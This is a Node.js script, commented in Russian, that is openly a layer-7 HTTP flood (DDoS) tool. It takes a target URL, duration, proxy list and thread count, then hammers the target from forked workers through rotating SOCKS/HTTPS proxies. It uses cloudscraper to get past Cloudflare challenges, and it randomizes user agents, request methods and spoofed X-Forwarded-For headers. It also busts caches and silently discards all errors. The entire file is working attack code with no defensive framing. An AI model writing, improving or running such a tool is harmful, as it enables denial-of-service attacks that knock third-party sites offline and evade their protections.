require('events').EventEmitter.defaultMaxListeners = Infinity;
const cloudscraper = require('cloudscraper');
const axios = require('axios');
const http = require('http');
const https = require('https');
const path = require('path');
const fs = require('fs');
const cluster = require('cluster');
const userAgents = require('user-agents');
const tough = require('tough-cookie');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

// Конфиг
const TARGET_URL = process.argv[2];
const ATTACK_DURATION = parseInt(process.argv[3]) * 1000;
const REQUESTS_PER_PROXY = parseInt(process.argv[4]);
const PROXY_FILE = process.argv[5];
const THREAD_COUNT = parseInt(process.argv[6]);

const PROXIES = fs.readFileSync(PROXY_FILE, 'utf-8').split('\n').filter(Boolean);
const ACTIVE_PROXIES = new Set();

// Генератор фейковых TLS параметров
const getTLSFingerprint = () => ({
  ciphers: [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256'
  ].join(':'),
  alpnProtocols: ['h2', 'http/1.1']
});

// Создаем кастомные агенты
const createAgent = (proxy) => {
  if (proxy.startsWith('socks')) {
    return new SocksProxyAgent(proxy, { timeout: 5000 });
  }
  return new HttpsProxyAgent(proxy, { timeout: 5000 });
};

// Основная функция атаки
const attack = async () => {
  while (true) {
    try {
      const proxy = PROXIES[Math.floor(Math.random() * PROXIES.length)];
      if (!ACTIVE_PROXIES.has(proxy)) {
        ACTIVE_PROXIES.add(proxy);
        console.log(`[+] Активирован прокси: ${proxy}`);
      }

      const agent = createAgent(proxy);
      const userAgent = new userAgents({ deviceCategory: 'desktop' }).toString();
      const cookieJar = new tough.CookieJar();

      const options = {
        uri: TARGET_URL + '?cache=' + Date.now(),
        method: ['GET', 'POST', 'HEAD'][Math.floor(Math.random() * 3)],
        headers: {
          'User-Agent': userAgent,
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.9',
          'Cache-Control': 'no-cache',
          'Pragma': 'no-cache',
          'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
        },
        agent: agent,
        jar: cookieJar,
        timeout: 8000,
        followAllRedirects: true,
        challengesToSolve: 3
      };

      // Основной запрос
      await cloudscraper(options);
      console.log(`[+] Успешный запрос через ${proxy}`);

      // Дополнительные запросы
      for (let i = 0; i < REQUESTS_PER_PROXY; i++) {
        setTimeout(() => {
          cloudscraper(options).catch(() => {});
        }, Math.random() * 1000);
      }

    } catch (err) {
      // console.error(`[!] Ошибка: ${err.message}`);
      continue;
    }
  }
};

// Запуск в кластере
if (cluster.isMaster) {
  console.log(`[!] Запускаю ${THREAD_COUNT} потоков...`);
  for (let i = 0; i < THREAD_COUNT; i++) {
    cluster.fork();
  }
} else {
  attack();
}

// Таймер завершения
setTimeout(() => {
  console.log('[!] Атака завершена');
  process.exit(0);
}, ATTACK_DURATION);

// Обработка ошибок
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
